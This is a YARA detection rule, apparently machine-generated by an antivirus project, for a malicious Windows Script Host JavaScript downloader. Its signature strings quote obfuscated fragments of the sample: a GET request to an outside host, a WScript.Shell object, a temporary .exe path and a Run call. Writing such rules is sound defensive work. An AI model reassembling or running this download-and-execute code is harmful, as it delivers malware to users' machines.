rule sig_20160401_ec95855506e984a81fad502b839250c2 {
  meta:
    description = "datamaliciousorder - file 20160401_ec95855506e984a81fad502b839250c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e0f7a70662061684152a64a752147c55c0b91ae780637149cff25b213c6fd766"

  strings:
    $s1  = "QgHjn[ZpVo](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "var KooHdf = function ZdgWmd() {return WScript[TrTt](\"WScript\"+\".Shell\");}(), DuiFig = 11;" fullword ascii
    $s3  = "function HfiRws(EnTc, CkkVzp){YtTwb = YtTwb * 1; return EnTc - CkkVzp;};" fullword ascii
    $s4  = "if (QgHjn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MbaGr(){return EloNii + \"\";};" fullword ascii
    $s6  = "function LmaSb() {return KooHdf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bQy4c8UknJ4NGWF.ex\" + \"e\";};" fullword ascii
    $s7  = "function InQd() {return ((ItrIb == true) && (ItrIb == WzuDse)) ? 1 : YtTwb;};" fullword ascii
    $s8  = "}while (LqSmc);" fullword ascii
    $s9  = "WzuDse = true; " fullword ascii
    $s10 = "ItrIb = true; " fullword ascii
    $s11 = "function TwUgv(){return TrTt;};" fullword ascii
    $s12 = "var WzuDse = false;" fullword ascii
    $s13 = "function DqAxf(){return 23;};" fullword ascii
    $s14 = "var WuLr = new this[\"Date\"]();" fullword ascii
    $s15 = "function VeqXeq(LvBat){KooHdf[\"R\"+\"un\"](LvBat, YtTwb, YtTwb);};" fullword ascii
    $s16 = "var LeFg = false;" fullword ascii
    $s17 = "var ItrIb = false;" fullword ascii
    $s18 = "function RbxGjr(HgRan) {var YmiZcp = (1, 2, 3, 4, 5, HgRan); return YmiZcp;};" fullword ascii
    $s19 = "function IfaNm()" fullword ascii
    $s20 = "return HfiRws(MzQy, TvqBre);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}